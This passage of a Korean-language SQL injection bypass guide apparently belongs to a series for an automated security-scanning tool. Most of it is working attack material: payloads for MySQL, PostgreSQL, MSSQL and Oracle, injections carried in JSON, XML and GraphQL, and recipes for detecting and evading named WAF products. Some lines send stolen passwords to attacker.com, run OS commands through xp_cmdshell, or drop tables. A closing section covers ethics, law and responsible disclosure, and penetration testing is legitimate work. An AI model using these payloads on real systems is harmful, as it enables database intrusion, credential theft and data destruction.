/*!50000SELECT*/ * FROM users
/*!UNION*/ /*!SELECT*/ password /*!FROM*/ users

-- 백틱 식별자
SELECT * FROM `users` WHERE `name`='admin'

-- 변수 사용
SET @a=0x73656C656374202A2066726F6D207573657273;  -- "select * from users"
PREPARE stmt FROM @a;
EXECUTE stmt;

-- HANDLER 문 (SELECT 대체)
HANDLER users OPEN;
HANDLER users READ FIRST;
HANDLER users CLOSE;

-- 산술 표현
SELECT * FROM users WHERE id=1+0
SELECT * FROM users WHERE id=2-1
SELECT * FROM users WHERE id=1*1
SELECT * FROM users WHERE id=2/2
SELECT * FROM users WHERE id=1%2  -- 나머지

-- 비트 연산
SELECT * FROM users WHERE id=1&1
SELECT * FROM users WHERE id=1|0
SELECT * FROM users WHERE id=1^0

-- 공백 대체 (MySQL)
SELECT%0Apassword%0AFROM%0Ausers
SELECT%09password%09FROM%09users
SELECT%0Bpassword%0BFROM%0Busers
SELECT%0Cpassword%0CFROM%0Cusers
```

### 8.2 PostgreSQL Specific

```sql
-- Dollar Quoting (쿼트 우회)
SELECT * FROM users WHERE name = $$admin$$
SELECT * FROM users WHERE name = $tag$admin$tag$

-- E-string (이스케이프 시퀀스)
SELECT * FROM users WHERE name = E'admin'
SELECT * FROM users WHERE name = E'\x61\x64\x6d\x69\x6e'  -- admin

-- COPY 명령 (파일 읽기)
COPY (SELECT '') TO PROGRAM 'command';

-- 타입 캐스팅 우회
SELECT * FROM users WHERE id = '1'::integer

-- String aggregation
SELECT string_agg(column_name,',') FROM information_schema.columns

-- generate_series로 시간 지연
SELECT * FROM generate_series(1,10000000);
```

### 8.3 MSSQL Specific

```sql
-- 대괄호 식별자
SELECT * FROM [users] WHERE [name]='admin'

-- EXEC 동적 실행
EXEC('SEL' + 'ECT * FROM users')
EXEC sp_executesql N'SELECT * FROM users'

-- 확장 저장 프로시저
EXEC xp_cmdshell 'dir'
EXEC xp_dirtree '\\attacker.com\share'

-- OPENROWSET (Out-of-band)
SELECT * FROM OPENROWSET('SQLOLEDB','server';'user';'pass','SELECT 1')

-- 문자열 연결 (+)
SELECT 'ad' + 'min'

-- TOP 절
SELECT TOP 1 password FROM users

-- 유니코드
SELECT NCHAR(83)+NCHAR(69)+NCHAR(76)+NCHAR(69)+NCHAR(67)+NCHAR(84)  -- SELECT
```

### 8.4 Oracle Specific

```sql
-- Q-Quoting (쿼트 우회)
SELECT * FROM users WHERE name = Q'[admin]'
SELECT * FROM users WHERE name = Q'{admin}'
SELECT * FROM users WHERE name = Q'<admin>'

-- DUAL 테이블
SELECT 1 FROM DUAL
SELECT banner FROM v$version WHERE ROWNUM=1

-- ROWNUM (LIMIT 대체)
SELECT * FROM users WHERE ROWNUM <= 1

-- UTL_HTTP (Out-of-band)
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM DUAL

-- 파이프라인 함수
SELECT * FROM TABLE(dbms_xplan.display)

-- XMLTYPE (에러 기반)
SELECT XMLTYPE((SELECT password FROM users WHERE ROWNUM=1)) FROM DUAL
```

---

## 9. JSON/XML Context Bypass

### 9.1 JSON Context SQLi

```
┌─────────────────────────────────────────────────────────────┐
│                    JSON 컨텍스트 SQLi                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  현대 API: JSON 본문으로 데이터 전송                        │
│  → 전통적 폼 기반 필터가 미적용되는 경우 많음              │
│                                                              │
│  요청 형태:                                                  │
│  POST /api/users HTTP/1.1                                   │
│  Content-Type: application/json                             │
│                                                              │
│  {"username": "admin", "password": "pass123"}               │
│                                                              │
│  주입 위치:                                                  │
│  {"username": "admin' OR '1'='1", "password": "x"}          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**JSON 특수 우회 기법:**
```yaml
json_bypass_techniques:
  # 1. Unicode 이스케이프 활용
  unicode_escape:
    original: "' OR '1'='1"
    bypassed: "\\u0027 OR \\u00271\\u0027=\\u00271"
    explanation: "JSON 파서가 디코딩 → WAF 우회 가능"

  # 2. 중첩 JSON
  nested_json:
    payload: '{"data": {"query": "admin\' OR \'1\'=\'1"}}'
    target: "중첩된 값에서 필터 미적용"

  # 3. 배열 활용
  array_injection:
    payload: '{"ids": ["1", "2\' OR \'1\'=\'1"]}'
    target: "배열 요소에서 필터 미적용"

  # 4. Content-Type 없이 JSON
  no_content_type:
    payload: '{"user": "admin\' --"}'
    header: "Content-Type 없이 전송"
    target: "파서가 자동 감지, 필터 미적용"

  # 5. charset 조작
  charset_trick:
    header: "Content-Type: application/json; charset=utf-7"
    payload: "+ACc- OR +ACc-1+ACc-=+ACc-1"
    explanation: "UTF-7로 쿼트 인코딩"
```

**JSON 필드별 공격 예시:**
```json
// 일반 필드 주입
{"search": "test' UNION SELECT password FROM users--"}

// ID 필드 (숫자 컨텍스트)
{"id": "1 OR 1=1"}
{"id": 1}  // vs {"id": "1 OR 1=1"}

// 정렬/필터 필드 (ORDER BY 취약점)
{"sort": "name; DROP TABLE users--"}
{"filter": {"column": "id", "value": "1' OR '1'='1"}}

// 복잡한 쿼리 빌더
{
  "where": [
    {"field": "status", "op": "=", "value": "active' OR '1'='1"}
  ]
}
```

### 9.2 XML Context SQLi

```
┌─────────────────────────────────────────────────────────────┐
│                    XML 컨텍스트 SQLi                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  SOAP/XML-RPC API에서 발생                                  │
│  → XML 파싱 후 값이 SQL 쿼리에 사용                        │
│                                                              │
│  요청 형태:                                                  │
│  POST /api/soap HTTP/1.1                                    │
│  Content-Type: application/xml                              │
│                                                              │
│  <request>                                                  │
│    <username>admin</username>                               │
│    <password>pass123</password>                             │
│  </request>                                                  │
│                                                              │
│  주입 위치:                                                  │
│  <username>admin' OR '1'='1</username>                      │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**XML 특수 우회 기법:**
```yaml
xml_bypass_techniques:
  # 1. CDATA 섹션 활용
  cdata_bypass:
    payload: "<username><![CDATA[admin' OR '1'='1]]></username>"
    explanation: "CDATA 내용은 파싱되지 않음 → 필터 우회"

  # 2. 엔티티 인코딩
  entity_encoding:
    original: "' OR '1'='1"
    payload: "&apos; OR &apos;1&apos;=&apos;1"
    numeric: "&#39; OR &#39;1&#39;=&#39;1"

  # 3. 외부 엔티티 (XXE + SQLi)
  external_entity:
    payload: |
      <!DOCTYPE foo [
        <!ENTITY sqli "' OR '1'='1">
      ]>
      <request><username>&sqli;</username></request>
    warning: "XXE가 가능한 경우에만"

  # 4. 네임스페이스 혼란
  namespace_confusion:
    payload: '<ns1:username xmlns:ns1="http://...">admin'' OR ''1''=''1</ns1:username>'

  # 5. 인코딩 선언 조작
  encoding_trick:
    payload: '<?xml version="1.0" encoding="UTF-7"?><data>...'
```

### 9.3 GraphQL SQLi

```yaml
graphql_sqli:
  description: "GraphQL 쿼리를 통한 SQLi"

  # 변수를 통한 주입
  variable_injection:
    query: |
      query GetUser($id: String!) {
        user(id: $id) { name, email }
      }
    variables: '{"id": "1\\' OR \\'1\\'=\\'1"}'

  # 인라인 인자 주입
  inline_injection:
    query: 'query { user(id: "1\' OR \'1\'=\'1") { name } }'

  # 배치 쿼리 활용
  batch_injection:
    payload: |
      [
        {"query": "{ user(id: \"1\") { name } }"},
        {"query": "{ user(id: \"1' OR '1'='1\") { name } }"}
      ]

  # Directive 주입
  directive_injection:
    query: 'query { user(id: "1") @include(if: $inject) { name } }'
    note: "일부 구현에서 directive 값이 처리되는 경우"
```

---

## 10. WAF 탐지 및 우회

### 10.1 WAF 탐지 방법

```
Step 1: 기본 페이로드 전송
' OR 1=1--

Step 2: 응답 분석
┌─────────────────────────────────────────────────────────────┐
│  응답                        │  의미                       │
├─────────────────────────────────────────────────────────────┤
│  200 OK + 정상 결과          │  WAF 없거나 미탐지          │
│  200 OK + 빈 결과/에러       │  앱 레벨 필터 또는 SQLi     │
│  403 Forbidden               │  WAF 차단                   │
│  406 Not Acceptable          │  WAF 차단                   │
│  501 Not Implemented         │  WAF 차단                   │
│  Response에 특정 문구        │  WAF 존재                   │
└─────────────────────────────────────────────────────────────┘

WAF 시그니처 문자열:
- "Access Denied"
- "Request Blocked"
- "ModSecurity"
- "WebKnight"
- "NAXSI"
- "F5 BIG-IP"
- "Cloudflare Ray ID"
- "AWS WAF"
```

### 10.2 주요 WAF 우회 전략

```yaml
ModSecurity:
  detection:
    - "ModSecurity" in response
    - "NOYB" in response
  bypass:
    - inline_comment: "UN/**/ION SEL/**/ECT"
    - case_variation: "uNiOn SeLeCt"
    - hpp: "?id=1&id=' UNION SELECT--"
    - encoding_chain: "%2527 (double URL)"

Cloudflare:
  detection:
    - "cf-ray" header
    - "__cfduid" cookie
    - "Attention Required!" page
  bypass:
    - unicode: "%u0027"
    - chunked: "Transfer-Encoding: chunked"
    - origin_bypass: "직접 원본 IP 접근"

AWS WAF:
  detection:
    - "x-amzn-waf" header
    - 403 with specific body
  bypass:
    - case_variation: 효과적
    - encoding_chain: 효과적
    - content_type_change: JSON으로 변환

Imperva/Incapsula:
  detection:
    - "incap_ses" cookie
    - "visid_incap" cookie
  bypass:
    - hpp: 효과적
    - comment_obfuscation: 효과적

F5 BIG-IP ASM:
  detection:
    - "TS" cookie prefix
    - Specific error pages
  bypass:
    - whitespace_variation: %0A, %0D
    - mysql_version_comment: /*!50000*/
```

### 10.3 점진적 우회 시도

```
Level 1: 기본 변형
' OR 1=1--
' oR 1=1--          (case)
'%20OR%201=1--      (URL encode)

Level 2: 주석/공백 변형
'/**/OR/**/1=1--
' OR%0A1=1--
' OR%091=1--

Level 3: 인코딩 체인
'%27%20OR%201=1--   (single URL)
'%2527%2520OR--     (double URL)

Level 4: 키워드 대체
' || 1=1--
' OR 1 LIKE 1--

Level 5: HTTP 레벨
HPP, Content-Type 변경, Chunked

Level 6: DBMS 특화
/*!50000UNION*/
$$string$$
[identifier]
```

---

## 11. Filter Detection Logic

### 11.1 필터 유형 식별 알고리즘

```
┌─────────────────────────────────────────────────────────────┐
│              Filter Detection Decision Tree                  │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Test 1: 싱글 쿼트 (')                                      │
│  ├─ 통과 → Quote 필터 없음                                  │
│  └─ 차단 → Quote 필터 존재                                  │
│      └─ Test: %27 시도                                      │
│          ├─ 통과 → URL Decode 전 필터                       │
│          └─ 차단 → URL Decode 후 필터                       │
│              └─ Test: %2527 시도                            │
│                  ├─ 통과 → Single Decode 필터               │
│                  └─ 차단 → Multi-layer 필터                 │
│                                                              │
│  Test 2: UNION 키워드                                       │
│  ├─ 통과 → Keyword 필터 없음                                │
│  └─ 차단 → Keyword 필터 존재                                │
│      └─ Test: union (소문자)                                │
│          ├─ 통과 → Case-Sensitive 필터                     │
│          └─ 차단 → Case-Insensitive 필터                   │
│              └─ Test: UNI/**/ON                             │
│                  ├─ 통과 → 문자열 매칭 필터                 │
│                  └─ 차단 → 정규식/주석제거 필터            │
│                                                              │
│  Test 3: 공백                                               │
│  ├─ 통과 → Space 필터 없음                                  │
│  └─ 차단 → Space 필터 존재                                  │
│      └─ Test: %09 (tab)                                     │
│          ├─ 통과 → Space만 필터                            │
│          └─ 차단 → 모든 공백 필터                          │
│              └─ Test: /**/                                  │
│                  ├─ 통과 → 주석으로 우회 가능              │
│                  └─ 차단 → 주석도 필터                     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 11.2 자동 필터 탐지 테스트 순서

```yaml
detection_sequence:
  - name: "Quote Filter Test"
    tests:
      - payload: "'"
        result_blocked: "quote_filtered"
        result_passed: "quote_allowed"
      - payload: "%27"
        condition: "quote_filtered"
        result_passed: "url_decode_after_filter"
      - payload: "%2527"
        condition: "url_decode_after_filter"
        result_passed: "single_decode_filter"

  - name: "Keyword Filter Test"
    tests:
      - payload: "UNION"
        result_blocked: "keyword_filtered"
      - payload: "union"
        condition: "keyword_filtered"
        result_passed: "case_sensitive_filter"
      - payload: "UNI/**/ON"
        condition: "keyword_filtered"
        result_passed: "string_match_filter"
      - payload: "UN%49ON"
        condition: "keyword_filtered"
        result_passed: "char_level_filter"

  - name: "Space Filter Test"
    tests:
      - payload: "1 AND 1"
        result_blocked: "space_filtered"
      - payload: "1%09AND%091"
        condition: "space_filtered"
        result_passed: "only_space_filtered"
      - payload: "1/**/AND/**/1"
        condition: "space_filtered"
        result_passed: "comment_allowed"

  - name: "Comment Filter Test"
    tests:
      - payload: "1--"
        result_blocked: "doubledash_filtered"
      - payload: "1#"
        condition: "doubledash_filtered"
        result_passed: "hash_allowed"
      - payload: "1/*"
        condition: "doubledash_filtered"
        result_passed: "block_comment_allowed"
```

### 11.3 필터 프로파일 생성

```yaml
filter_profile_example:
  target: "example.com"

  detected_filters:
    quote:
      type: "blocked"
      url_encoded: "passed"
      double_encoded: "blocked"
      hex: "passed"

    keywords:
      UNION: "blocked"
      union: "blocked"
      "UNI/**/ON": "passed"

    space:
      space: "passed"
      tab: "passed"
      newline: "passed"

    comment:
      "--": "passed"
      "#": "blocked"
      "/**/": "passed"

  effective_bypasses:
    - "inline_comment"
    - "url_encoding"
    - "hex_encoding"

  recommended_payload_template: |
    %27%20UNI/**/ON%20SEL/**/ECT%20{data}%20FR/**/OM%20{table}--
```

---

## 12. Bypass Decision Tree

### 12.1 상황별 우회 전략 선택

```
┌─────────────────────────────────────────────────────────────┐
│                 Bypass Strategy Decision Tree                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Q1: WAF 존재?                                              │
│  ├─ Yes → WAF 유형 식별 → 해당 WAF 우회 전략               │
│  └─ No  → Q2로 이동                                         │
│                                                              │
│  Q2: Quote 필터?                                            │
│  ├─ Yes → Hex, CHAR(), 숫자 컨텍스트 확인                  │
│  └─ No  → Q3로 이동                                         │
│                                                              │
│  Q3: Keyword 필터?                                          │
│  ├─ Yes → Case 변환 → 주석 삽입 → 대체 키워드             │
│  └─ No  → Q4로 이동                                         │
│                                                              │
│  Q4: Space 필터?                                            │
│  ├─ Yes → Tab/Newline → 주석 → 괄호                        │
│  └─ No  → Q5로 이동                                         │
│                                                              │
│  Q5: Comment 필터?                                          │
│  ├─ Yes → 다른 주석 유형 → 쿼트 밸런싱                     │
│  └─ No  → 기본 페이로드 사용                               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 12.2 우선순위 기반 우회 시도

```yaml
bypass_priority:
  - priority: 1
    name: "Case Variation"
    risk: "low"
    effectiveness: "medium"
    apply_to: ["keywords"]

  - priority: 2
    name: "URL Encoding"
    risk: "low"
    effectiveness: "medium"
    apply_to: ["special_chars"]

  - priority: 3
    name: "Inline Comment"
    risk: "low"
    effectiveness: "high"
    apply_to: ["keywords", "spaces"]

  - priority: 4
    name: "Whitespace Substitution"
    risk: "low"
    effectiveness: "medium"
    apply_to: ["spaces"]

  - priority: 5
    name: "Double URL Encoding"
    risk: "medium"
    effectiveness: "medium"
    apply_to: ["special_chars"]

  - priority: 6
    name: "Hex Encoding"
    risk: "low"
    effectiveness: "high"
    apply_to: ["strings", "quotes"]

  - priority: 7
    name: "HPP"
    risk: "medium"
    effectiveness: "high"
    apply_to: ["full_payload"]

  - priority: 8
    name: "Chunked Encoding"
    risk: "high"
    effectiveness: "high"
    apply_to: ["full_payload"]
```

---

## 13. 종합 Bypass Matrix

### 13.1 필터 유형별 우회 매핑

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        Filter × Bypass Matrix                            │
├──────────────────┬──────┬──────┬──────┬──────┬──────┬──────┬──────────┤
│  Bypass          │Quote │Space │Keyword│Comment│ WAF  │ AND/ │ UNION/  │
│  Technique       │Filter│Filter│Filter │Filter │Basic │ OR   │ SELECT  │
├──────────────────┼──────┼──────┼──────┼──────┼──────┼──────┼──────────┤
│ URL Encode       │  ✅  │  ✅  │  ❌  │  ✅  │  ⚠️  │  ❌  │   ❌    │
│ Double URL       │  ✅  │  ✅  │  ❌  │  ✅  │  ✅  │  ❌  │   ❌    │
│ Hex Encode       │  ✅  │  ❌  │  ❌  │  ❌  │  ⚠️  │  ❌  │   ❌    │
│ Case Variation   │  ❌  │  ❌  │  ✅  │  ❌  │  ⚠️  │  ✅  │   ✅    │
│ Inline Comment   │  ❌  │  ✅  │  ✅  │  ❌  │  ✅  │  ✅  │   ✅    │
│ Version Comment  │  ❌  │  ✅  │  ✅  │  ✅  │  ✅  │  ✅  │   ✅    │
│ CHAR/CHR()       │  ✅  │  ❌  │  ⚠️  │  ❌  │  ⚠️  │  ❌  │   ❌    │
│ Concatenation    │  ✅  │  ❌  │  ✅  │  ❌  │  ⚠️  │  ❌  │   ⚠️    │
│ Tab/Newline      │  ❌  │  ✅  │  ❌  │  ❌  │  ⚠️  │  ❌  │   ❌    │
│ Parenthesis      │  ❌  │  ✅  │  ❌  │  ❌  │  ⚠️  │  ❌  │   ⚠️    │
│ Operator Alt     │  ❌  │  ❌  │  ❌  │  ❌  │  ⚠️  │  ✅  │   ❌    │
│ HPP              │  ❌  │  ❌  │  ❌  │  ❌  │  ✅  │  ⚠️  │   ⚠️    │
│ Chunked          │  ❌  │  ❌  │  ❌  │  ❌  │  ✅  │  ⚠️  │   ⚠️    │
│ Content-Type     │  ❌  │  ❌  │  ❌  │  ❌  │  ✅  │  ❌  │   ❌    │
└──────────────────┴──────┴──────┴──────┴──────┴──────┴──────┴──────────┘

✅ = 효과적
⚠️ = 상황에 따라
❌ = 비효과적
```

### 13.2 DBMS별 우회 가용성

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        DBMS × Bypass Matrix                              │
├──────────────────┬──────────┬──────────┬──────────┬──────────┬─────────┤
│  Bypass          │  MySQL   │PostgreSQL│  MSSQL   │  Oracle  │ SQLite  │
├──────────────────┼──────────┼──────────┼──────────┼──────────┼─────────┤
│ Inline Comment   │    ✅    │    ✅    │    ✅    │    ✅    │   ✅    │
│ Version Comment  │    ✅    │    ❌    │    ❌    │    ❌    │   ❌    │
│ Hex String       │    ✅    │    ⚠️    │    ✅    │    ⚠️    │   ✅    │
│ CHAR()           │    ✅    │   CHR()  │    ✅    │  CHR()   │   ✅    │
│ Concat Space     │    ✅    │    ❌    │    ❌    │    ❌    │   ❌    │
│ || Concat        │    ⚠️    │    ✅    │    ❌    │    ✅    │   ✅    │
│ + Concat         │    ❌    │    ❌    │    ✅    │    ❌    │   ❌    │
│ Dollar Quote     │    ❌    │    ✅    │    ❌    │    ❌    │   ❌    │
│ Q'[] Quote       │    ❌    │    ❌    │    ❌    │    ✅    │   ❌    │
│ Backtick ID      │    ✅    │    ❌    │    ❌    │    ❌    │   ✅    │
│ Bracket ID       │    ❌    │    ❌    │    ✅    │    ❌    │   ❌    │
│ # Comment        │    ✅    │    ❌    │    ❌    │    ❌    │   ❌    │
│ Stacked Query    │    ⚠️    │    ✅    │    ✅    │    ❌    │   ✅    │
└──────────────────┴──────────┴──────────┴──────────┴──────────┴─────────┘
```

### 13.3 종합 우회 체인 예시

```sql
-- 시나리오: Quote + Keyword + Space 필터, MySQL

-- 원본 페이로드
' UNION SELECT password FROM users--

-- 적용 우회 체인:
-- 1. Quote → Hex encoding
-- 2. Keyword → Inline comment + Case variation
-- 3. Space → Tab (%09)

-- 결과
0x27%09uNiOn%09/**/sElEcT%09password%09FrOm%09users--

-- 또는
%27%09UN/**/ION%09SEL/**/ECT%09password%09FR/**/OM%09users--
```

---

## 부록: 빠른 참조 치트시트

### A. Encoding 치트시트

```
Character | URL    | Double | Hex    | HTML     | Unicode
----------|--------|--------|--------|----------|--------
'         | %27    | %2527  | 0x27   | &#39;    | %u0027
"         | %22    | %2522  | 0x22   | &#34;    | %u0022
(space)   | %20    | %2520  | 0x20   | &#32;    | %u0020
=         | %3D    | %253D  | 0x3D   | &#61;    | %u003D
<         | %3C    | %253C  | 0x3C   | &lt;     | %u003C
>         | %3E    | %253E  | 0x3E   | &gt;     | %u003E
(         | %28    | %2528  | 0x28   | &#40;    | %u0028
)         | %29    | %2529  | 0x29   | &#41;    | %u0029
```

### B. Keyword 대체 치트시트

```
Original  | Alternatives
----------|--------------------------------------------------
AND       | &&, %26%26, aNd, AN/**/D
OR        | ||, %7C%7C, oR, O/**/R
UNION     | uNiOn, UN/**/ION, /*!UNION*/, %55NION
SELECT    | sElEcT, SEL/**/ECT, /*!SELECT*/, %53ELECT
FROM      | fRoM, FR/**/OM, /*!FROM*/
WHERE     | wHeRe, WH/**/ERE, /*!WHERE*/
=         | LIKE, REGEXP, RLIKE, IN, BETWEEN
' '       | %09, %0A, %0D, /**/, (), +
```

### C. DBMS 식별 치트시트

```
Error Message Contains    | DBMS
--------------------------|----------------
mysql_fetch               | MySQL
You have an error in SQL  | MySQL
pg_query                  | PostgreSQL
PSQLException             | PostgreSQL
ORA-                      | Oracle
PLS-                      | Oracle
Microsoft OLE DB          | MSSQL
Unclosed quotation        | MSSQL
SQLite                    | SQLite
```

---

## 14. Safety & Ethics

### 14.1 보안 연구 윤리 가이드라인

```
┌─────────────────────────────────────────────────────────────┐
│                    보안 연구 윤리 원칙                       │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ⚠️  본 문서의 기법은 교육/연구 목적으로만 사용해야 함     │
│                                                              │
│  ✅ 허용되는 사용                                           │
│  ├─ 본인 소유/관리하는 시스템 테스트                       │
│  ├─ 명시적 서면 허가를 받은 침투 테스트                    │
│  ├─ Bug Bounty 프로그램 범위 내 테스트                     │
│  ├─ CTF(Capture The Flag) 대회                             │
│  └─ 교육용 취약한 환경 (DVWA, WebGoat 등)                  │
│                                                              │
│  ❌ 금지되는 사용                                           │
│  ├─ 허가 없는 시스템 접근 시도                             │
│  ├─ 실제 운영 환경에 무단 테스트                           │
│  ├─ 데이터 탈취/파괴 목적                                  │
│  ├─ 범죄 행위 지원                                         │
│  └─ 서비스 거부(DoS) 유발                                  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 14.2 법적 고려사항

```yaml
legal_framework:
  korea:
    law: "정보통신망 이용촉진 및 정보보호 등에 관한 법률"
    article: "제48조 (정보통신망 침해행위 등의 금지)"
    penalty: "3년 이하의 징역 또는 3천만원 이하의 벌금"

  international:
    cfaa: "Computer Fraud and Abuse Act (미국)"
    cma: "Computer Misuse Act (영국)"
    gdpr: "개인정보 유출 시 GDPR 위반 (유럽)"

  authorization_requirements:
    - "테스트 범위 명시된 서면 계약"
    - "응급 연락처 확보"
    - "테스트 시간대 합의"
    - "데이터 처리 방침 명시"
    - "보고 절차 합의"
```

### 14.3 테스트 환경 구축

```yaml
safe_testing_environments:
  local_labs:
    - name: "DVWA (Damn Vulnerable Web Application)"
      setup: "Docker: docker run --rm -it -p 80:80 vulnerables/web-dvwa"
      features: "SQLi, XSS, CSRF 등 다양한 취약점"

    - name: "WebGoat"
      setup: "Docker: docker run -p 8080:8080 webgoat/webgoat"
      features: "OWASP 기반 학습 플랫폼"

    - name: "SQLi-labs"
      setup: "Docker: docker run -d -p 80:80 acgpiano/sqli-labs"
      features: "SQLi 전문 학습 환경, 다양한 시나리오"

    - name: "HackTheBox / TryHackMe"
      type: "온라인 플랫폼"
      features: "CTF 스타일 합법적 테스트 환경"

  custom_lab:
    recommendation: |
      1. 가상머신(VirtualBox/VMware)에 격리 환경 구축
      2. 네트워크 분리 (Host-only 또는 Internal)
      3. 스냅샷으로 초기 상태 보존
      4. 실제 개인정보 사용 금지
```

### 14.4 책임 있는 공개 (Responsible Disclosure)

```yaml
disclosure_process:
  step_1:
    action: "취약점 발견"
    guideline: "증거 수집, 재현 방법 문서화"

  step_2:
    action: "벤더/조직 연락"
    guideline: |
      - 공식 보안 연락처 사용 (security@example.com)
      - Bug Bounty 프로그램 있으면 해당 채널 사용
      - 암호화된 채널 권장 (PGP)

  step_3:
    action: "대응 대기"
    guideline: |
      - 일반적으로 90일 대기
      - 긴급한 경우 더 짧은 기간
      - 무응답 시 CERT에 보고

  step_4:
    action: "공개"
    guideline: |
      - 패치 후 적정 시간 대기
      - 기술 세부사항은 책임있게 공개
      - 익스플로잇 코드는 교육 목적으로만

do_not:
  - "취약점을 이용한 추가 침투"
  - "데이터 다운로드/복사"
  - "타인에게 무단 공유"
  - "금전 요구 (협박)"
  - "SNS 즉시 공개"
```

### 14.5 AI-DAST 도구 사용 가이드

```yaml
ai_dast_ethics:
  before_scanning:
    - "대상 시스템 소유자의 명시적 허가 획득"
    - "스캔 범위와 시간대 합의"
    - "비상 연락처 확보"
    - "테스트 환경 분리 확인"

  during_scanning:
    - "Rate limiting 준수 (DoS 방지)"
    - "실제 데이터 조작/삭제 금지"
    - "발견된 취약점 즉시 기록"
    - "이상 징후 시 즉시 중단"

  after_scanning:
    - "모든 테스트 데이터 안전하게 삭제"
    - "결과 보고서 암호화 저장"
    - "발견 사항 책임있게 보고"
    - "재현 방법 상세 문서화"

  logging_requirements:
    - "모든 테스트 요청 로그 보관"
    - "타임스탬프 포함"
    - "담당자 기록"
    - "법적 분쟁 대비 증거 보존"
```

---

> **이전 문서**: 01_SQLi_Complete_Guide.md (SQLi 본질)
> **다음 문서**: 03_DBMS_MySQL.md (MySQL 상세)
